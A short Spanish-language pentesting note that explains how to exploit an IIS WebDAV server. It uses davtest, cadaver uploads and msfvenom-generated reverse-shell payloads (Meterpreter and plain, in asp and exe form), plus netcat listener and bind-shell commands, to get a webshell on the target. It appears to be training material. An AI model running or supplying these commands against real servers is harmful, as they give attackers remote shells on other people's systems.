Webdav es una feature de IIS que permite la transferencia de archivos al servidor, por lo que en combinación con la enumeración aportada por la herramienta davtest, podremos subir un fichero malicioso con la extensión a la cuál permita escritura y ejecución, por ejemplo, suponiendo que permite subida y ejecución de archivos .asp:

# Creación del payload con msfvenom:

### Meterpreter tcp payload reverse shell

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp`

Con msfconsole usar módulo **exploit/multi/handler** para poner en escucha y recibir sessión meterpreter.

## Sin meterpreter: 
### Reverse shell
Crea conexión desde la víctima hacia el atacante por TCP al puerto especificado.

`msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > shell.exe

Nos ponemos en escucha con netcat : `nc -nvlp <puerto>`

### Bind shell

Abre un puerto especificado en la víctima y el atacante puede conectarse cuando quiera a través de netcat:
`nc 192.168.1.10 4444
`

# Explotación de webdav:

 1.- Conexión al servidor webdav con Cadaver:

`cadaver http://<IP_DEL_SERVIDOR>/webdav
`
2.- Subida del fichero malicioso:
`put ruta/archivo.asp`

3.- Ve al navegador y carga el fichero subido y se obtendrá la webshell